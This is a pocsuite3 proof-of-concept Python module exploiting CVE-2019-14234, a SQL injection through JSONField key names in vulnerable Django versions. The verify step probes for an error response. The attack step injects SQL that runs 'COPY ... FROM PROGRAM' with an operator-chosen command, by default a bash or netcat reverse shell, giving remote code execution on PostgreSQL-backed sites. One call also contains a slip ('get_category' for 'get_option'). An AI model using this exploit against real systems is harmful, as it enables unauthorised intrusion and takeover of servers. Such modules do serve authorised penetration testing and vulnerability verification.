import os, base64
from collections import OrderedDict

from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, logger, OptString, OptDict, REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str

# 'Result':{
#    'DBInfo' :   {'Username': 'xxx', 'Password': 'xxx', 'Salt': 'xxx' , 'Uid':'xxx' , 'Groupid':'xxx'},
#    'ShellInfo': {'URL': 'xxx', 'Content': 'xxx' },
#    'FileInfo':  {'Filename':'xxx','Content':'xxx'},
#    'XSSInfo':   {'URL':'xxx','Payload':'xxx'},
#    'AdminInfo': {'Uid':'xxx' , 'Username':'xxx' , 'Password':'xxx' }
#    'Database':  {'Hostname':'xxx', 'Username':'xxx',  'Password':'xxx', 'DBname':'xxx'},
#    'VerifyInfo':{'URL': 'xxx' , 'Postdata':'xxx' , 'Path':'xxx'}
#    'SiteAttr':  {'Process':'xxx'}
#    'Stdout': 'result output string'
# }

class DemoPOC(POCBase):
    vulID = 'CVE-2019-14234'
    version = '1.0'
    author = ['cz']
    vulDate = '2019-11-17'
    createDate = '2019-11-17'
    updateDate = '2019-11-17'
    references = ['https://xz.aliyun.com/t/5896', 'https://www.djangoproject.com/weblog/2019/aug/01/security-releases/']
    name = 'CVE-2019-14234 Django JSON SQL注入'
    appPowerLink = ''
    appName = 'Django'
    appVersion = '1.11.x-1.11.22 2.1.x-2.1.10 2.2.x-2.2.3'
    vulType = 'SQL Injection'
    desc = '''该漏洞需要开发者使用了JSONField/HStoreField，且用户可控queryset查询时的键名，在键名的位置注入SQL语句。Django自带的后台应用Django-Admin中就存在这样的写法。'''
    samples = []
    install_requires = ['']
    pocDesc = 'Django-Admin中存在注入，同时前台也可能存在注入。由于没有回显，所以attack总会返回成功，请手工验证。'
    testedEnv = ['windows_10_x64-Django_2.2.3-POstgreSQL_9.6']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail()
        return output

    def _options(self):
        o = OrderedDict()
        payload = {
            "nc": REVERSE_PAYLOAD.NC,
            "bash": REVERSE_PAYLOAD.BASH,
        }
        o['dbJSONField'] = OptString('', description='可查询的任一JSonField', require=True)
        o["command"] = OptDict(selected="bash", default=payload)
        return o

    def _verify(self):
        result = {}

        payload = self.get_option('dbJSONField') + '__' + "a'bc" + '=123'
        resp = requests.get(self.target, params=payload)
        try:
            if resp.status_code == 500:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
                result['VerifyInfo']['Postdata'] = payload
        except Exception as ex:
            logger.error(str(ex))
        return self.parse_output(result)

    def _check(self):
        payload = self.get_option('dbJSONField') + '__' + "a'bc" + '=123'
        resp = requests.get(self.target, params=payload)

    def _attack(self):
        result = {}

        cmd = self.get_option('command')
        payload = self.get_option('dbJSONField') + '__' + '''author'?'a') OR 1=2 ;CREATE table cmd_exec(cmd_output text) -- '''
        resp = requests.get(self.url, params=payload)
        
        payload = self.get_category('dbJSONField') + '__' + '''COPY cmd_exec FROM PROGRAM '{}' -- '''.format(cmd)
        resp = requests.get(self.url, params=payload)

        try:
            if resp.status_code == 500:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
                result['VerifyInfo']['Postdata'] = payload
        except Exception as ex:
            logger.error(str(ex))
        return self.parse_output(result)
    
register_poc(DemoPOC)